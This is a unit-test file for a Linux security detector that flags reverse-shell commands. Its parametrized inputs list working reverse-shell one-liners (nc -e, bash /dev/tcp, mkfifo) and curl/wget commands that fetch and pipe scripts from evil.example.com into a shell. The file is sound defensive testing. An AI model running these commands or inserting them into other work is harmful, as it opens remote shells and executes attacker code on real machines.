"""Unit tests for core/linux_security/process_detector.py."""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from core.linux_security.models import LinuxLogEvent, LinuxSecurityFindingCategory
from core.linux_security.process_detector import (
    find_suspicious_commands,
    scan_generic_process_lines,
)

pytestmark = pytest.mark.unit

_NOW = datetime(2026, 7, 18, 10, 10, 0, tzinfo=UTC)


@pytest.mark.parametrize(
    "command",
    [
        "nc -e /bin/sh 10.0.0.1 4444",
        "ncat -e /bin/bash 10.0.0.1 4444",
        "bash -c '0<&196;exec 196<>/dev/tcp/10.0.0.1/4444'",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "python3 -c 'import socket,os;s=socket.socket()'",
        "perl -e 'use Socket;'",
        "echo cGF5bG9hZA== | base64 -d | bash",
        "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f",
        "curl http://evil.example.com/x.sh | bash",
        "wget -O - http://evil.example.com/x.sh | sh",
    ],
)
def test_known_reverse_shell_shapes_detected(command: str) -> None:
    candidates = find_suspicious_commands(command, subject="test")
    assert len(candidates) >= 1
    assert all(c.category == LinuxSecurityFindingCategory.REVERSE_SHELL for c in candidates)


def test_benign_command_not_flagged() -> None:
    assert find_suspicious_commands("systemctl restart nginx", subject="test") == []


def test_empty_text_returns_no_candidates() -> None:
    assert find_suspicious_commands("", subject="test") == []


def test_scan_generic_process_lines_scans_every_event() -> None:
    events = [
        LinuxLogEvent(
            timestamp=_NOW,
            process="anything",
            raw_message="nc -e /bin/sh 10.0.0.1 4444",
            line_number=1,
        ),
        LinuxLogEvent(timestamp=_NOW, process="anything", raw_message="ls -la", line_number=2),
    ]
    candidates = scan_generic_process_lines(events)
    assert len(candidates) == 1
    assert candidates[0].line_numbers == (1,)
